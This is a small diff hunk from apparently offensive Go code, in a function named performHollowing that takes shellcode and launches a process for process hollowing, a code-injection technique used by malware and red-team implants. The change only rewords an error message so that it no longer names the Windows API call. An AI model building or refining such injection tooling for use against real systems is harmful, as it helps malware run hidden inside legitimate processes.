@@ -167,7 +167,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			uintptr(unsafe.Pointer(&pi)),
 		)
 		if ret == 0 {
-			return sb.String(), fmt.Errorf("CreateProcessW failed: %w", lastErr)
+			return sb.String(), fmt.Errorf("Process creation failed: %w", lastErr)
 		}
 	} else {
 		err = syscall.CreateProcess(
